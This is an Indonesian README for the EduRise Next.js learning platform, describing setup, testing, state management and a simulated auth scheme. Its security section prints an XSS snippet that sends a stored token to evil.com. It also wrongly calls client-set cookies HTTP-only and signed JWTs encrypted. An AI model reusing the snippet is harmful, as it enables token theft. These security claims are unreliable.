# EduRise - Platform Pembelajaran Online

Platform pembelajaran online yang dibangun dengan Next.js 16, menampilkan sistem manajemen kursus, autentikasi pengguna, dan pengalaman belajar yang interaktif.

## 📋 Daftar Isi

- [Instalasi](#instalasi)
  - [Menjalankan dengan Docker Compose](#menjalankan-dengan-docker-compose)
- [Arsitektur Aplikasi](#arsitektur-aplikasi)
- [State Management dengan React Query & Zustand](#state-management-dengan-react-query--zustand)
- [Strategi Keamanan](#strategi-keamanan)
- [Struktur Folder](#struktur-folder)
- [Tech Stack](#tech-stack)

---

## 🚀 Instalasi

### Prerequisites

- Node.js 18.x atau lebih tinggi
- **pnpm** (package manager yang digunakan project ini)

> ⚠️ **Penting**: Project ini menggunakan **pnpm**. Pastikan pnpm sudah terinstall:
>
> ```bash
> npm install -g pnpm
> ```

### Langkah Instalasi

1. **Clone repository**

```bash
git clone <repository-url>
cd edu-rise
```

2. **Install dependencies**

```bash
pnpm install
```

3. **Jalankan development server**

```bash
pnpm dev
```

4. **Buka aplikasi**

Akses aplikasi di browser: [http://localhost:3000](http://localhost:3000)

---

### 🐳 Menjalankan dengan Docker Compose (Alternatif)

Jika Anda ingin menjalankan project menggunakan Docker, pastikan **Docker** dan **Docker Compose** sudah terinstall.

**Langkah-langkah:**

1. **Build dan jalankan container**

```bash
docker-compose up --build
```

2. **Buka aplikasi**

Akses aplikasi di browser: [http://localhost:3000](http://localhost:3000)

**Perintah lain:**

```bash
# Jalankan di background
docker-compose up -d --build

# Stop container
docker-compose down

# Rebuild setelah perubahan
docker-compose up --build
```

> 💡 **Catatan**: Docker akan menjalankan aplikasi di port `3000` dengan file `Dockerfile.dev` yang menggunakan image `node:20-alpine` dan `pnpm` sebagai package manager.

### Data Dummy untuk Testing

Aplikasi ini menggunakan **mock backend** dengan data disimpan di **IndexedDB** browser.

**Cara Testing:**

1. **Buat akun baru** melalui halaman Register (`/register`)
2. **Login** menggunakan akun yang sudah dibuat
3. Data akan tersimpan di IndexedDB browser (persistent)

> 💡 **Catatan**: Data akan hilang jika IndexedDB browser dihapus (clear browser data)

> ⚠️ **Troubleshooting**: Jika saat **pertama kali membuka aplikasi** atau saat **mencoba registrasi terjadi error**, kemungkinan ada masalah cache browser dengan mock service worker (MSW). Silakan lakukan **hard reload** dengan menekan `Cmd + Shift + R` (Mac) atau `Ctrl + Shift + R` (Windows), lalu coba registrasi lagi.

---

## 🏗️ Arsitektur Aplikasi

### Keputusan Arsitektur Utama

#### 1. **App Router (Next.js 16)**

Menggunakan App Router Next.js 16 untuk memanfaatkan fitur-fitur terbaru:

- **Server Components**: Mengurangi JavaScript bundle size di client
- **Streaming & Suspense**: Loading state yang lebih baik
- **Route Groups**: Organisasi route yang lebih fleksibel dengan `(dashboard)` dan `(auth)`
- **Middleware**: Implementasi route protection yang efisien

#### 2. **Pemisahan Komponen**

Struktur komponen dibagi menjadi 3 kategori utama:

**a. Features Components (`components/features/`)**

- Komponen spesifik untuk fitur tertentu (auth, courses, dashboard, profile)
- Business logic terikat dengan domain tertentu
- Contoh: `LoginForm`, `CourseCardItem`, `FilterSidebar`

**b. Shared Components (`components/shared/`)**

- Komponen reusable yang tidak terikat domain spesifik
- Dapat digunakan di berbagai fitur
- Contoh: `SectionContent`, `StateStatus`, `TabNavigation`

**c. UI Components (`components/ui/`)**

- Komponen presentational murni (pure UI)
- Tidak memiliki business logic
- Highly reusable dan configurable
- Contoh: `Button`, `Input`, `Icon`

**Alasan Pemisahan:**

- **Separation of Concerns**: Setiap layer punya tanggung jawab yang jelas
- **Reusability**: UI components bisa dipakai di mana saja tanpa dependency
- **Maintainability**: Mudah mencari dan mengupdate komponen
- **Scalability**: Struktur yang jelas untuk project yang berkembang

#### 3. **Mock Backend dengan MSW**

Menggunakan Mock Service Worker (MSW) untuk simulasi API:

**Alasan:**

- **Development Paralel**: Frontend bisa develop tanpa tunggu backend
- **Testing**: Mudah test berbagai skenario (success, error, edge cases)
- **Offline Development**: Tidak bergantung pada koneksi internet atau server external
- **Consistent Data**: Data dummy yang konsisten untuk semua developer

**Implementasi:**

- Handler API di `mocks/handlers.ts`
- IndexedDB untuk persistensi data (simulasi database)
- Support full CRUD operations

#### 4. **Custom Hooks Pattern**

Setiap fitur memiliki custom hooks untuk encapsulate logic:

- `useAuth` - Authentication logic
- `useMyCourses` - Course management
- `useCourseList` - Course fetching dengan filtering
- `useUpdatePassword` - Password update logic

**Benefits:**

- **Code Reuse**: Logic bisa dipakai di berbagai components
- **Testability**: Hooks bisa ditest secara isolated
- **Separation**: UI terpisah dari business logic

---

## 🧪 Strategi Pengujian (Testing)

Project ini menggunakan **Vitest** dikombinasikan dengan **React Testing Library (RTL)** untuk melakukan pengujian otomatis (_Automated Testing_). Pendekatan ini dipilih karena Vitest memiliki performa yang sangat cepat, _watch mode_ yang instan, serta kompatibilitas penuh dengan ekosistem Vite/Next.js.

### ⚙️ Setup & Konfigurasi

Pengujian dikonfigurasi untuk berjalan di atas _virtual browser environment_ menggunakan `jsdom`.

**1. `vitest.config.ts`**

Konfigurasi utama diletakkan pada root project untuk mengaktifkan fitur _global matchers_ dan mendefinisikan environment testing.

```typescript
import { defineConfig } from 'vitest/config';
import react from '@vitejs/plugin-react';
import path from 'path';

export default defineConfig({
  plugins: [react()],
  test: {
    globals: true,
    environment: 'jsdom',
    setupFiles: ['./vitest.setup.ts'],
    css: true,
  },
  resolve: {
    alias: {
      '@': path.resolve(__dirname, './'),
    },
  },
});
```

**2. `vitest.setup.ts`**

File ini digunakan untuk import custom matchers dari `@testing-library/jest-dom`:

```typescript
import '@testing-library/jest-dom/vitest';
```

**3. `tsconfig.json`**

Tambahkan types untuk Vitest dan Jest-DOM:

```json
{
  "compilerOptions": {
    "types": ["vitest/globals", "@testing-library/jest-dom"]
  }
}
```

### 🚀 Menjalankan Test

```bash
# Menjalankan dalam Watch Mode (Sangat disarankan saat development)
pnpm test

# Menjalankan test dengan UI
pnpm test:ui

# Melihat laporan cakupan kode (Test Coverage)
pnpm test:coverage
```

### 📂 Struktur File Test

Setiap komponen memiliki folder `__tests__` yang berisi file test:

```
components/
├── ui/
│   ├── button/
│   │   ├── Button.tsx
│   │   └── __tests__/
│   │       └── Button.test.tsx
│   ├── input/
│   │   ├── Input.tsx
│   │   └── __tests__/
│   │       └── Input.test.tsx
│   └── switch/
│       ├── Switch.tsx
│       └── __tests__/
│           └── Switch.test.tsx
```

### ✅ Contoh Test Case

**Button Component:**

```typescript
import { fireEvent, render, screen } from '@testing-library/react';
import { describe, expect, it, vi } from 'vitest';
import Button from '../Button';

describe('Button', () => {
  it('renders button with label', () => {
    render(<Button label="Click Me" />);
    expect(screen.getByText('Click Me')).toBeInTheDocument();
  });

  it('calls onClick when clicked', () => {
    const handleClick = vi.fn();
    render(<Button label="Click" onClick={handleClick} />);

    fireEvent.click(screen.getByText('Click'));
    expect(handleClick).toHaveBeenCalledTimes(1);
  });

  it('does not call onClick when disabled', () => {
    const handleClick = vi.fn();
    render(<Button label="Disabled" onClick={handleClick} disabled />);

    const button = screen.getByRole('button');
    fireEvent.click(button);
    expect(handleClick).not.toHaveBeenCalled();
  });

  it('shows loading state and disables button', () => {
    render(<Button label="Submit" isLoading />);
    expect(screen.getByRole('button')).toBeDisabled();
  });
});
```

### 🎯 Testing Best Practices

**1. Test User Behavior, Not Implementation**

- Fokus pada apa yang user lihat dan lakukan
- Gunakan `getByRole`, `getByText`, `getByLabelText` daripada `getByTestId`

**2. Arrange-Act-Assert Pattern**

```typescript
// Arrange: Setup komponen
render(<Button label="Click" onClick={handleClick} />);

// Act: Lakukan aksi
fireEvent.click(screen.getByText('Click'));

// Assert: Verifikasi hasil
expect(handleClick).toHaveBeenCalled();
```

**3. Test Accessibility**

- Gunakan `getByRole` untuk memastikan semantic HTML
- Test keyboard navigation
- Test screen reader compatibility

**4. Mock External Dependencies**

```typescript
vi.mock('@/services/api', () => ({
  fetchCourses: vi.fn(() => Promise.resolve(mockData)),
}));
```

### 📊 Coverage Goals

Target minimum coverage untuk project ini:

- **Statements**: 80%
- **Branches**: 75%
- **Functions**: 80%
- **Lines**: 80%

Komponen UI critical (Button, Input, Form) harus memiliki coverage 100%.

### 🔍 Apa yang Harus Di-Test?

**✅ Harus di-test:**

- User interactions (click, type, submit)
- Conditional rendering
- Props validation
- Error states
- Loading states
- Accessibility (a11y)

**❌ Tidak perlu di-test:**

- Implementation details
- Third-party libraries
- Styling (gunakan visual regression testing)
- Static content

---

## 📊 State Management dengan React Query & Zustand

Project ini menggunakan **hybrid approach** untuk state management:

- **React Query** → Server state (data dari API)
- **Zustand** → Shared client state (autentikasi)
- **useState** → Local UI state (form, modal, toggle)

### React Query (TanStack Query) — Server State

**Keputusan:** Menggunakan React Query untuk mengelola **server state**.

#### Alasan Pemilihan React Query:

- ✅ **Automatic Caching**: Data di-cache otomatis, mengurangi request redundan
- ✅ **Background Refetching**: Data selalu fresh tanpa user action
- ✅ **Optimistic Updates**: UI update instant sebelum API response
- ✅ **Request Deduplication**: Multiple request ke endpoint sama dijadikan 1
- ✅ **Garbage Collection**: Cache yang tidak terpakai otomatis dibersihkan

```typescript
// Tanpa React Query (manual)
const [data, setData] = useState(null);
const [loading, setLoading] = useState(false);
const [error, setError] = useState(null);

useEffect(() => {
  setLoading(true);
  fetch('/api/courses')
    .then((res) => res.json())
    .then((data) => setData(data))
    .catch((err) => setError(err))
    .finally(() => setLoading(false));
}, []);

// Dengan React Query ✅
const { data, isLoading, error } = useQuery({
  queryKey: ['courses'],
  queryFn: getCourses,
});
```

#### Performance Optimization:

- **Stale While Revalidate**: Tampilkan cache dulu, fetch di background
- **Window Focus Refetching**: Auto-refetch pas user kembali ke tab
- **Retry Logic**: Auto-retry pas request gagal
- **Query Invalidation**: Selective cache invalidation

### Zustand — Shared Client State

**Keputusan:** Menggunakan **Zustand** untuk shared client state yang perlu diakses dari banyak komponen.

#### Mengapa Zustand?

- ✅ **Lightweight**: ~1KB, tidak ada boilerplate seperti Redux
- ✅ **Simple API**: Menggunakan hooks, tidak perlu Provider wrapper
- ✅ **No Prop Drilling**: State bisa diakses dari komponen mana saja
- ✅ **TypeScript Native**: Full type safety tanpa konfigurasi tambahan
- ✅ **No Re-render Issues**: Hanya komponen yang menggunakan state tertentu yang re-render

#### Implementasi — Auth Store:

```typescript
// stores/useAuthStore.ts
import { create } from 'zustand';

interface AuthState {
  user: User | null;
  isAuthenticated: boolean;
  setUser: (user: User | null) => void;
  logout: () => void;
}

export const useAuthStore = create<AuthState>((set) => ({
  user: null,
  isAuthenticated: false,
  setUser: (user) => set({ user, isAuthenticated: !!user }),
  logout: () => set({ user: null, isAuthenticated: false }),
}));
```

#### Penggunaan di Komponen:

```typescript
// Mengambil seluruh state (akan re-render saat state berubah)
const { user, isAuthenticated } = useAuthStore();

// Mengambil state spesifik (hanya re-render saat field ini berubah)
const user = useAuthStore((state) => state.user);
const setUser = useAuthStore((state) => state.setUser);
```

#### Mengapa React Query + Zustand, Bukan Redux?

| Aspek          | Redux                             | React Query + Zustand |
| -------------- | --------------------------------- | --------------------- |
| Server State   | Manual caching                    | Automatic caching ✅  |
| Boilerplate    | Banyak (actions, reducers, types) | Minimal               |
| Learning Curve | Curam                             | Flat                  |
| Bundle Size    | ~7KB                              | ~1KB (Zustand)        |

**Kesimpulan:** React Query untuk server state + Zustand untuk shared client state adalah kombinasi yang **efisien dan minimal**.

#### Strategy: Hybrid Approach

```
Server State → React Query
  - User data (sync dengan API)
  - Courses
  - Categories
  - My courses

Shared Client State → Zustand
  - Auth state (user, isAuthenticated)
  - User preferences

Local Client State → useState / useReducer
  - Form state (React Hook Form)
  - Modal / Drawer open state
  - Local filters & search
```

---

## 🔐 Strategi Keamanan

### 1. Token Authentication (Simulasi)

#### Penyimpanan Token: Cookies vs localStorage

**Pilihan:** **HTTP-Only Cookies** (disimulasikan dengan `cookies-next`)

#### Perbandingan:

| Aspek                | localStorage      | HTTP-Only Cookies         |
| -------------------- | ----------------- | ------------------------- |
| **XSS Attack**       | ❌ Vulnerable     | ✅ Protected              |
| **CSRF Attack**      | ✅ Not vulnerable | ⚠️ Vulnerable (mitigable) |
| **JavaScript Akses** | ✅ Ya             | ❌ Tidak                  |
| **Auto-send**        | ❌ Manual         | ✅ Automatic              |
| **Size Limit**       | ~5-10MB           | ~4KB                      |

#### Implementasi di Aplikasi:

```typescript
// Setting cookie (simulasi HTTP-Only)
setCookie('token', jwtToken, {
  maxAge: 60 * 60 * 24, // 24 jam
  path: '/',
  sameSite: 'strict', // CSRF protection
  // secure: true, // Enable di production (HTTPS only)
});
```

**Alasan:**

1. **XSS Protection**: Token tidak bisa diakses via `document.cookie` dari JavaScript
2. **Automatic Sending**: Browser auto-attach cookie ke setiap request
3. **SameSite Policy**: Mencegah CSRF attack
4. **Production Ready**: Pattern yang sama dengan real-world apps

#### Alternative yang TIDAK Dipilih:

**localStorage:**

```typescript
// ❌ VULNERABLE TO XSS
localStorage.setItem('token', token);

// Attacker bisa inject:
<script>
  fetch('https://evil.com?token=' + localStorage.getItem('token'))
</script>
```

**sessionStorage:**

- Same vulnerability dengan localStorage
- Data hilang pas tab ditutup (UX buruk)

### 2. Middleware Proxy untuk Route Protection

Menggunakan Next.js Middleware (`proxy.ts`) untuk protect routes:

**Implementasi:**

```typescript
// proxy.ts
export const proxy = (request: NextRequest) => {
  const token = request.cookies.get('token')?.value;
  const path = nextUrl.pathname;

  const isPrivateRoute = privateRoutes.some((route) => {
    const pattern = route.replace(/\[.*?\]/g, '[^/]+');
    return new RegExp(`^${pattern}$`).test(path);
  });

  const isAuthRoute = authRoutes.some((route) => {
    const pattern = route.replace(/\[.*?\]/g, '[^/]+');
    return new RegExp(`^${pattern}$`).test(path);
  });

  // Redirect ke root jika user sudah login tapi akses auth route
  if (token && isAuthRoute) {
    return NextResponse.redirect(new URL(ROOT_PATH, url));
  }

  // Redirect ke login jika user belum login tapi akses private route
  if (!token && isPrivateRoute) {
    return NextResponse.redirect(new URL(LOGIN_PATH, url));
  }

  return NextResponse.next();
};
```

**Fungsi Middleware:**

- ✅ **Server-side validation**: Validasi dilakukan di server sebelum page load
- ✅ **Prevent unauthorized access**: Block akses ke protected routes tanpa token
- ✅ **Auto-redirect authenticated users**: User yang sudah login diarahkan ke dashboard jika akses `/login` atau `/register`
- ✅ **Dynamic route matching**: Support dynamic routes dengan regex pattern
- ✅ **Better UX**: Instant redirect tanpa flash content

### 3. JWT Token (Simulasi)

Menggunakan `jose` library untuk encode/decode JWT:

```typescript
// Generate token
const token = await new SignJWT({ email: user.email })
  .setProtectedHeader({ alg: 'HS256' })
  .setExpirationTime('24h')
  .sign(secret);
```

**Security Features:**

- ✅ Expiration time (auto-logout setelah 24 jam)
- ✅ Signature verification
- ✅ Payload encryption

### 4. Data Isolation per User

Setiap user hanya bisa akses data mereka sendiri:

```typescript
// Mock API handler
const decoded = jwtDecode<{ email: string }>(token);
const userCourses = allCourses.filter(
  (course) => course.email === decoded.email
);
```

### 5. Input Validation

Menggunakan Zod schema untuk validasi input:

```typescript
const loginSchema = z.object({
  email: z.string().email('Email tidak valid'),
  password: z
    .string()
    .min(8, 'Password minimal 8 karakter')
    .regex(/[A-Z]/, 'Harus ada huruf besar'),
});
```

**Benefits:**

- ✅ Type-safe validation
- ✅ Runtime validation
- ✅ Prevent injection attacks

---

## 📁 Struktur Folder

```
edu-rise/
├── app/                          # Next.js App Router
│   ├── (auth)/                  # Auth routes (login, register)
│   │   ├── login/
│   │   └── register/
│   ├── (dashboard)/             # Protected routes
│   │   ├── courses/
│   │   ├── profile/
│   │   └── page.tsx            # Dashboard home
│   └── layout.tsx
│
├── components/
│   ├── features/                # Feature-specific components
│   │   ├── auth/               # Login, Register forms
│   │   ├── courses/            # Course list, filters
│   │   ├── dashboard/          # Dashboard widgets
│   │   └── profile/            # Profile forms
│   ├── shared/                  # Shared reusable components
│   │   ├── course-card-item/
│   │   ├── layout/
│   │   └── section-content/
│   └── ui/                      # Pure UI components
│       ├── button/
│       ├── input/
│       └── icon/
│
├── lib/
│   ├── hooks/                   # Custom React hooks
│   │   ├── courses/
│   │   └── useAuth.ts
│   ├── types/                   # TypeScript types
│   ├── helpers/                 # Utility functions
│   ├── axios.ts                # Axios instance
│   ├── index-db.ts             # IndexedDB operations
│   └── tanstack-query.ts       # React Query setup
│
├── mocks/
│   ├── handlers.ts              # MSW API handlers
│   ├── mockCourses.ts          # Mock data
│   └── browser.ts              # MSW browser setup
│
├── schemas/                     # Zod validation schemas
│   ├── auth.schema.ts
│   └── profile.schema.ts
│
├── services/                    # API service functions
│   ├── auth.service.ts
│   ├── course.service.ts
│   └── profile.service.ts
│
└── routes.ts                    # Route constants
```

### Penjelasan Struktur:

**Route Groups `(folder)`:**

- Organisasi routes tanpa mempengaruhi URL
- `(auth)` dan `(dashboard)` untuk layouts berbeda

**Feature-based Organization:**

- Setiap feature punya folder sendiri
- Mudah untuk code splitting dan lazy loading

**Separation of Concerns:**

- `services/` - API calls
- `lib/hooks/` - Business logic
- `components/` - UI presentation
- `schemas/` - Validation rules

---

## 🛠️ Tech Stack

### Core

- **Next.js 16** - React framework dengan App Router
- **React 19** - UI library dengan Server Components
- **TypeScript** - Type safety

### Styling

- **Tailwind CSS** - Utility-first CSS
- **classnames** - Conditional className utility

### State Management & Data Fetching

- **TanStack Query (React Query)** - Server state management
- **React Hook Form** - Form state management
- **Zod** - Schema validation

### Mock Backend

- **MSW (Mock Service Worker)** - API mocking
- **idb** - IndexedDB wrapper untuk persistensi data
- **jose** - JWT encoding/decoding

### Development Tools

- **ESLint** - Code linting
- **Prettier** - Code formatting
- **TypeScript** - Static type checking
- **Husky** - Git hooks untuk enforce code quality
- **Commitlint** - Conventional commit message validation

---

## 🎯 Fitur Utama

- ✅ Autentikasi & Otorisasi (simulasi)
- ✅ Manajemen Kursus (browse, filter, search)
- ✅ My Courses (add, track progress)
- ✅ Profile Management
- ✅ Responsive Design (mobile-first)
- ✅ Loading & Error States
- ✅ Toast Notifications
- ✅ Route Protection
- ✅ Data Persistence (IndexedDB)

---

## 📝 Catatan Penting

### Simulasi vs Production

Aplikasi ini menggunakan **mock backend** untuk development. Untuk production:

1. Replace MSW handlers dengan real API calls
2. Implement proper backend authentication
3. Enable HTTPS dan secure cookies
4. Add rate limiting & request throttling
5. Implement proper error logging (Sentry, etc.)

### Optimisasi yang Diimplementasikan

- ✅ React.memo untuk prevent unnecessary re-renders
- ✅ useCallback untuk stable function references
- ✅ React Query caching untuk reduce API calls
- ✅ Per-card loading states untuk better UX
- ✅ Debounced search untuk reduce requests
- ✅ Lazy loading untuk components (dynamic imports)

---

## � Git Hooks & Code Quality

### Husky

Project ini menggunakan **Husky** untuk menjalankan git hooks otomatis:

**Pre-commit Hook:**

- Menjalankan **lint-staged** untuk lint & format file yang di-stage
- Memastikan code yang di-commit sudah sesuai standard (ESLint + Prettier)
- Mencegah code yang error masuk ke repository

**Commit-msg Hook:**

- Menjalankan **commitlint** untuk validasi format commit message
- Enforce conventional commit format: `<type>(<scope>): <description>`
- Contoh valid: `feat(courses): add filter by category`

**Conventional Commit Types:**

```
feat:     Fitur baru
fix:      Bug fix
chore:    Maintenance/update dependencies
refactor: Code refactoring tanpa mengubah behavior
docs:     Update dokumentasi
style:    Formatting, missing semicolons, etc.
test:     Menambahkan test
```

**Benefits:**

- ✅ Consistent code style across team
- ✅ Clean git history
- ✅ Automated code quality checks
- ✅ Prevent bad commits

---

## 📄 License

MIT License - free to use and modify
